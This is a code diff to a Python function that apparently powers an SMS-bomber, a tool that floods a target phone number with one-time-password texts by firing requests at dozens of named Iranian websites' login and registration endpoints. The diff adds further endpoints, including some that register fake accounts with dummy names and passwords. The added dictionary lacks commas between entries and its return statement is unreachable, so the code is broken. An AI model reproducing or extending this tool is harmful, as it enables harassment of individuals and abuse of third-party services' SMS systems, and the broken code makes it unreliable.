@@ -2,10 +2,13 @@ def send_otp_requests(number):
     url_payload_map = {
         'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
         'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
+        'electrastore': ('https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone': '0' + number}),
+        'atrinelec': ('https://www.atrinelec.com/ajax/SendSmsVerfiyCode', {'mobile': '0' + number}),
         'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
         'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
         'noavarpub': ('https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F', {'phone': '0' + number,'submit':'123'}),
         'hovalvakil': ('https://api.hovalvakil.com/api/User/SendConfirmCode?userName='+ number +'', None),
+        'digighate': ('https://api.digighate.com/v2/public/code?phone='+ number +'', None),
         'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
         'kanoonbook': ('https://www.kanoonbook.ir/store/customer_otp', {'customer_username': number,'task':'customer_phone'}),
         'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,'login':'1'}),
@@ -133,20 +136,40 @@ def send_otp_requests(number):
             'ReturnUrl': 'https://mahouney.com/',
             'MobaileNumber': '0' + number,
         }),
-       'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request', {
-            '{"mobile_phone"': '"0'+ number +'"}',
-        }),
-       'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {
-            '{"mobile_phone"': '"0'+ number +'"}',
-        }), 
-        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {
-            '{"mobile_phone"': '"0'+ number +'"}',
-        }), 
         'myroz': ('https://myroz.ir/wp-admin/admin-ajax.php', {
             'action': 'stm_login_register',
             'type': 'mobile',
             'input': '0' + number,
-        }),        
-    }
+        }),
+        'meidane': ('https://meidane.com/accounts/login', {
+            'name': 'Mr',
+            'password': '123456',
+            'mobile': number,
+        }),
+        'ickala': ('https://ickala.com/', {
+            'controller': 'SendSMS','fc':'module',
+            'module': 'loginbymobile','SubmitSmsSend':'1',
+            'ajax': 'true',
+            'otp_mobile_num':'0' + number
+        }),
+        'microele': ('https://www.microele.com/login?back=my-account', {
+            'id_customer': '','back':',my-account',
+            'firstname': '123','lastname':'123',
+            'password': '123456','action':'register',
+            'username':'0' + number,'ajax':'1'
+        }),
+        'elecmarket': ('https://elecmarket.ir/wp-admin/admin-ajax.php', {
+            'action': 'stm_login_register','type':'mobile',
+            'input':'0' + number
+        })
 
+    }
+    url2_payload2_mapjson = {
+        'eaccount': ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone": "0"+number+""})
+        'queenaccessories': ('https://queenaccessories.ir/api/v1/sessions/login_request', {"mobile_phone": "0"+number+""})
+        'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {"mobile_phone": "0"+number+""})
+        'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone": "0"+number+""})
+        
+    }
     return list(url_payload_map.values())
+    return list(url2_payload2_mapjson.values())
